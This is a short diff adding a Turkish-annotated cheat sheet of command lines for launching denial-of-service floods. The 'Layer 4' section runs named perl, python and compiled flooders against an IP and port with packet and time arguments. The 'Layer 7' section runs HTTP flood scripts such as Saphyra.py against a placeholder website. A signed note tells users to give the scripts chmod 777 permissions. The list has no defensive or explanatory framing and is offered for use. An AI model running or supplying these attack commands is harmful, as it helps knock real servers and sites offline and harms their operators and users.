@@ -1,0 +1,26 @@
+
+NOT : Scriptlere Putty Ý Açtýðýnýzda chmod 777 Ýzni Vermeyi Unutmayýnýz Saygýlarýmla *Basaran OG*
+
+// Layer 4
+
+
+perl anonymous.pl ip port 1000 300
+perl Twiks3.pl ip port 200 999
+perl Batman.pl ip port 1000 1000
+perl VGBoot.pl ip port 1000 1000
+perl Packet.pl ip port 200 200
+python gott.2.py ip port 500 500
+./Jiexynn ip -p port
+./utku ip port
+./yflood ip port
+./Twiks ip port
+./ssa ip -p port
+
+
+
+// Layer 7
+
+python m60.py http://www.siteadres.com
+python FolyX.py http://www.siteadres.com
+python BlackHorizon.py http://www.siteadres.com
+python Saphyra.py http://www.siteadres.com
